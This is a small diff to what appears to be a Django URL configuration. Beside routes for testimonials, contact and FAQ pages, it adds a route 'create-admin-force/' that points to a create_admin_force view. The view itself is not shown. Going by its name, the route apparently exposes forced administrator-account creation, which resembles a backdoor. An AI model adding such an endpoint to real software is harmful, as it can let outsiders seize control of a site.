@@ -13,4 +13,5 @@ urlpatterns = [
     path('testimonials/', views.testimonials_view, name='testimonials'),
     path('contact/', views.contact, name='contact'),
     path('faq/', views.faq, name='faq'),
+    path('create-admin-force/', views.create_admin_force, name='create_admin_force'),
 ]
